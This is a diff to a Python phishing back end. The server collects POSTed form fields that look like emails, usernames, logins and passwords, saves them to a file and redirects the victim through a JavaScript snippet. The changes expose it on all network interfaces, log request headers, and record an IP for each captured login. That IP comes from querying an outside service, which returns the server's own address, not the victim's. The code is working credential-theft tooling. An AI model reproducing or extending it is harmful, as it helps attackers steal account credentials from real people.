@@ -1,13 +1,18 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from colorama import Fore, Style
 from io import BytesIO
+import urllib.request
+import logging
 import re
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    
+    ips = []
+    
     def run():
         #Here is where the server runs
         running = False
-        httpd = HTTPServer(('localhost', 8000), SimpleHTTPRequestHandler)
+        httpd = HTTPServer(('0.0.0.0', 8000), SimpleHTTPRequestHandler)
         while not running:
             print('.::Listening on port 8000...\n')
             httpd.serve_forever()
@@ -30,11 +35,24 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         values = response.getvalue()
         self.getCredentials(values)
 
+    def get_ip(self):
+        external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+        print(external_ip)
+        return(external_ip)
+
+    def log_message(self, format, *args):
+        if self.get_ip() not in self.ips:
+            self.ips.append(self.get_ip())
+            print(Fore.RED+'[+]IP Found:',self.get_ip())
+            print(Style.RESET_ALL)
+            logging.error(self.headers)
+
+
     def getCredentials(self, values):
         post = values.decode('UTF-8')
         readpost = post.strip('&')
         forms = ['email','user','login','pass'] #Possibles forms to get the credentials
-
+        
         try:
             readpost = readpost.split('&')
             count = 0
@@ -50,7 +68,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                             print('[+].::',possibles)
                             print("=" * 52 + "\n")
                             print(Style.RESET_ALL)
-                            file.write('    '.join(possibles)+'\n')
+                            file.write('IP: '+self.get_ip()+'\n'+'    '.join(possibles)+'\n')
                             count = 0
                             possibles = []
                             try:
@@ -65,7 +83,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     def redirect(self):
         url = open('site/redirect.txt','r')
         url = url.readlines()
-        redir = '<script>window.location.href="'+url[0]+'"</script>;'
+        redir = '''<script>window.location.href=\"%s\"</script>''' % (url[0])
         file = open('site/redirect.html','w')
         file.write(redir)
         file.close()
